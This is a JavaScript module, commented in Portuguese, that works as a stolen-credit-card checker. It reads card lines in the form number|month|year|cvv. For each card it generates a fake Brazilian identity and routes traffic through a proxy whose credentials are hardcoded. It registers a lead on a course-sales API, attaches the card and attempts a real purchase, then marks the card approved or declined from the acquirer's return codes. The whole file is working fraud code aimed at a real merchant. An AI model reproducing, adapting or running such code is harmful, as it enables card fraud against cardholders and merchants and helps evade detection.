import axios from 'axios';
import chalk from 'chalk';
import fs from 'fs';
import { HttpsProxyAgent } from 'https-proxy-agent';
import randomUseragent from 'random-useragent';


// Configuração do proxy
const proxyConfig = {
  protocol: 'http',
  host: 'rp.proxyscrape.com',
  port: 6060,
  auth: {
    username: 'jpn645m14q0pkq9-country-br',
    password: '1witm204vszvwdv'
  }
};
const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);

// Função para gerar pessoa aleatória
async function generateRandomPerson() {
  try {
    const response = await axios.post(
      'https://www.4devs.com.br/ferramentas_online.php',
      new URLSearchParams({
        'acao': 'gerar_pessoa',
        'sexo': 'I',
        'pontuacao': 'S',
        'idade': '0',
        'cep_estado': '',
        'txt_qtde': '1',
        'cep_cidade': ''
      }),
      {
        headers: {
          'Host': 'www.4devs.com.br',
          'sec-ch-ua-platform': '"Windows"',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
          'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
          'sec-ch-ua-mobile': '?0',
          'accept': '*/*',
          'origin': 'https://www.4devs.com.br',
          'sec-fetch-site': 'same-origin',
          'sec-fetch-mode': 'cors',
          'sec-fetch-dest': 'empty',
          'referer': 'https://www.4devs.com.br/gerador_de_pessoas',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
        }
      }
    );
    return response.data[0];
  } catch (error) {
    console.error('Erro ao gerar pessoa:', error.response?.data || error.message);
    return null;
  }
}

// Função de compra
async function makePurchase(numberGG, monthGG, yearGG, cvvGG) {
  const startTime = Date.now();  // Captura o tempo de início

  try {
    const randomPerson = await generateRandomPerson();
    if (!randomPerson) throw new Error('Falha ao gerar pessoa.');

    const cpfFormatted = randomPerson.cpf.replace(/\D/g, '');
    const userAgent = randomUseragent.getRandom();
    console.log(randomPerson.email)

    let cepSemTraco = randomPerson.cep.replace(/-/g, '');
    //console.log(`Tempo de requisição: ${durationInSeconds.toFixed(2)} segundos`);

    const response = await axios.post(
      'https://southamerica-east1-flash-student-410022.cloudfunctions.net/api/student/',
      {
        'taxes': {
          'boleto': {
            'price': '13.00',
            'tax': '21.55',
            'isActive': false
          },
          'pix': {
            'price': '13.00',
            'tax': '21.55',
            'isActive': false
          }
        },
        'email': randomPerson.email,
        'personType': 'Pf',
        'order': {
          'id': 100,
          'value': '13',
          'created': '2024-09-27T19:24:05.110Z',
          'paid': null,
          'products': [
            {
              'id': 13,
              'name': 'Assinatura Anual'
            }
          ],
          'productIds': [
            13
          ],
          'isBatch': null,
          'productNames': [
            'Assinatura Anual'
          ]
        },
        'name': randomPerson.nome,
        'identity': randomPerson.cpf,
        'phone': '(91) 98415-5843',
        'isLead': true,
        'abandonedCheckoutId': 100
      },
      {
        headers: {
          'Host': 'southamerica-east1-flash-student-410022.cloudfunctions.net',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
          'sec-ch-ua-mobile': '?0',
          'access-control-allow-origin': '*',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
          'access-control-allow-headers': 'Origin, X-Requested-With, Content-Type, Accept',
          'origin': 'https://portal.headenergia.net',
          'sec-fetch-site': 'cross-site',
          'sec-fetch-mode': 'cors',
          'sec-fetch-dest': 'empty',
          'referer': 'https://portal.headenergia.net/',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'priority': 'u=1, i'
        },
        httpsAgent: proxyAgent
      }
    );

    let iduser = response.data.student.id
    console.log("Make payment ", response.data)

    const addCard = await axios.post(
      'https://southamerica-east1-flash-student-410022.cloudfunctions.net/api/user/card/',
      {
        'number': numberGG,
        'holderName': randomPerson.nome,
        'expirationDate': `${monthGG}/${yearGG}`,
        'cvv': cvvGG,
        'user': {
          'id': iduser,
          'created': '2024-10-16T03:44:05.175Z',
          'updated': '2024-10-16T03:44:05.175Z',
          'deleted': null,
          'name': randomPerson.nome,
          'email': randomPerson.email,
          'password': null,
          'identity': cpfFormatted,
          'phone': '91984155843',
          'observation': null,
          'recoverPasswordCode': null,
          'abandonedCheckoutId': '100',
          'userId': '11119',
          'companyId': null,
          'curseducaId': null,
          'isLead': true,
          'convertedAt': null,
          'personType': 'Pf'
        }
      },
      {
        headers: {
          'Host': 'southamerica-east1-flash-student-410022.cloudfunctions.net',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
          'sec-ch-ua-mobile': '?0',
          'access-control-allow-origin': '*',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
          'access-control-allow-headers': 'Origin, X-Requested-With, Content-Type, Accept',
          'origin': 'https://portal.headenergia.net',
          'sec-fetch-site': 'cross-site',
          'sec-fetch-mode': 'cors',
          'sec-fetch-dest': 'empty',
          'referer': 'https://portal.headenergia.net/',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'priority': 'u=1, i'
        },
        httpsAgent: proxyAgent
      }
    );

    let idCard = addCard.data.userCard.id
    console.log(idCard)


    const makePurchase = await axios.post(
      'https://southamerica-east1-flash-student-410022.cloudfunctions.net/api/purchase/100',
      {
        'customerEmail': randomPerson.email,
        'card': {
          'id': idCard,
          'cvv': cvvGG
        },
        'paymentMethod': 'credit_card',
        'address': {
          'addressStreet': 'Rua Doutor Cincinato Braga',
          'addressNumber': '34',
          'addressState': 'RS',
          'addressCity': 'S\xC3\xA3o Bernardo do Campo',
          'addressZipCode': '09890-300'
        }
      },
      {
        headers: {
          'Host': 'southamerica-east1-flash-student-410022.cloudfunctions.net',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
          'sec-ch-ua-mobile': '?0',
          'access-control-allow-origin': '*',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
          'access-control-allow-headers': 'Origin, X-Requested-With, Content-Type, Accept',
          'origin': 'https://portal.headenergia.net',
          'sec-fetch-site': 'cross-site',
          'sec-fetch-mode': 'cors',
          'sec-fetch-dest': 'empty',
          'referer': 'https://portal.headenergia.net/',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'priority': 'u=1, i'
        },
        httpsAgent: proxyAgent
      }
    );
    console.log(makePurchase.data.purchase.charges[0].last_transaction)

    let returnCode = makePurchase.data.purchase.charges[0].last_transaction.acquirer_return_code;


    if (makePurchase.data.purchase.charges[0].last_transaction.status !== 'not_authorized') {

      console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - APROV R$80,00 💸|   [@im_Karmah]`));
      return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - APROV R$80,00 💸|   [@im_Karmah]`
    } else if (returnCode == '0000') {
      console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Pagamento Realizado R$80,00 💸|   [@im_Karmah]`));
      return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Pagamento Realizado R$80,00 💸|   [@im_Karmah]`
    } else if (returnCode == '1015') {
      console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Pagamento Realizado R$80,00 💸 💸|   [@im_Karmah]`));
      return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Pagamento Realizado R$80,00 💸 💸|   [@im_Karmah]`
    } else if (returnCode == '1045') {
      console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode}|${makePurchase.data.purchase.charges[0].last_transaction.acquirer_message} 💸|   [@im_Karmah]`));
      return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode}|${makePurchase.data.purchase.charges[0].last_transaction.acquirer_message} 💸|   [@im_Karmah]`
    } else if (returnCode == '1016') {
      console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode}|${makePurchase.data.purchase.charges[0].last_transaction.acquirer_message} 💸|   [@im_Karmah]`));
      return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode}|${makePurchase.data.purchase.charges[0].last_transaction.acquirer_message} 💸|   [@im_Karmah]`
    } else if (returnCode == '1022') {
      console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode}|${makePurchase.data.purchase.charges[0].last_transaction.acquirer_message} 💸|   [@im_Karmah]`));
      return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnCode}|${makePurchase.data.purchase.charges[0].last_transaction.acquirer_message} 💸|   [@im_Karmah]`
    } else {
      console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - REPROVADA - `));
      return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - REPROVADA - `
    }

  } catch (error) {
    console.log(error.response)

  }
}

async function executeFlow(value) {
  try {
    const [numberGG, monthGG, yearGG, cvvGG] = value.split('|');
    const yearSplited = yearGG.split('20')[1];
    // console.log(numberGG,monthGG,yearSplited,cvvGG)

    let respoonse = await makePurchase(numberGG, monthGG, yearSplited, cvvGG);
    return respoonse

  } catch (error) {
    console.error('Erro no fluxo principal:', error);
  }
}

export default executeFlow
